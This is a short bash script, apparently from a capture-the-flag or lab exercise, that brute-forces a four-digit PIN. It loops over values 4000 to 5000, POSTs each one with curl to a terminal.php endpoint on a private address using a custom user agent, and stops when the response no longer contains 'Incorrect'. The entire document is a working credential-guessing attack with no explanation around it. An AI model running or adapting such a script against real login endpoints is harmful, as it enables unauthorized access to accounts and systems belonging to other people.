for pin in {4000..5000}; do
  echo "Trying password: $pin"
  response=$(curl -A "secretcomputer" -X POST -d "pin=$pin" http://10.67.135.216/terminal.php?action=pin)
  if ! echo "$response" | grep -q "Incorrect"; then
    echo "[+] Pin found: $pin"
    break
  fi
done
